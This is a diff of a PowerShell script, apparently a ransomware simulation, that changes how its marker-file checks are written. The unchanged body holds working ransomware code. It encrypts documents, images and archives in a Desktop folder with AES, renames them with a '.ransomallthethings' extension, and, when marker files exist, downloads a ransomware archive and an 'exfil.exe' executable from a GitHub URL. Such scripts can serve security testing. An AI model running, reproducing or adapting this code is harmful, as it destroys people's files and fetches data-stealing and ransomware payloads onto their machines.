@@ -1,6 +1,9 @@
 $Folder = $HOME + '/Desktop/ImportantDocuments/'
-$Exfil = $HOME + '/Desktop/exfil'
-$sample = $HOME + '/Desktop/sample'
+$Exfil = @("$($HOME)\Desktop\exfil", "$($HOME)\Desktop\exfil.txt")
+$ExfilTest = Test-Path -Path $Exfil -PathType Leaf
+$sample = @("$($HOME)\Desktop\sample", "$($HOME)\Desktop\sample.txt")
+$sampleTest = Test-Path -Path $sample -PathType Leaf
+
 
 "Test to see if folder [$Folder] exists - v3"
 if (Test-Path -Path $Folder) {
@@ -11,7 +14,7 @@ if (Test-Path -Path $Folder) {
   $Folder | ForEach-Object {    Get-ChildItem -Path $Folder -Include "*.txt","*.doc","*.docx","*.pdf","*.jpeg","*.jpg","*.gif","*.png","*.xls","*.xlsx","*.zip","*.ppt","*.pptx" -Recurse | Where { $_.Length -le "200mb" } | ForEach-Object {       $c = [System.IO.File]::ReadAllBytes($_.FullName);       $cs = [System.Security.Cryptography.CryptoStream]::new($_.OpenWrite(), $aes_crypt, [System.Security.Cryptography.CryptoStreamMode]::Write);       $cs.Write($c, 0, $c.Length);       $cs.Close();       $_.MoveTo($_.FullName + ".ransomallthethings");    }} 
   Add-Type -AssemblyName PresentationCore,PresentationFramework 
   "Test to see if we are exfil-ing"
-  if (Test-Path -Path $sample -PathType Leaf) {
+  if ($sampleTest.contains('True')) {
     "******** Will download ransomware - DANGEROUS **************"
     $URL = 'https://github.com/PoesRaven/public/raw/master/darkpower.zip'
     $SamplePath = $HOME + '/Desktop/darkpower.zip'
@@ -32,7 +35,7 @@ if (Test-Path -Path $Folder) {
     "Will not download ransomware"
   }
   
-  if (Test-Path -Path $Exfil -PathType Leaf) {
+  if ($ExfilTest.contains('True')) {
     "Will exfil"
     $URL = 'https://github.com/PoesRaven/public/raw/master/exfil.exe'
     $ExfilPath = $HOME + '/Desktop/exfil.exe'
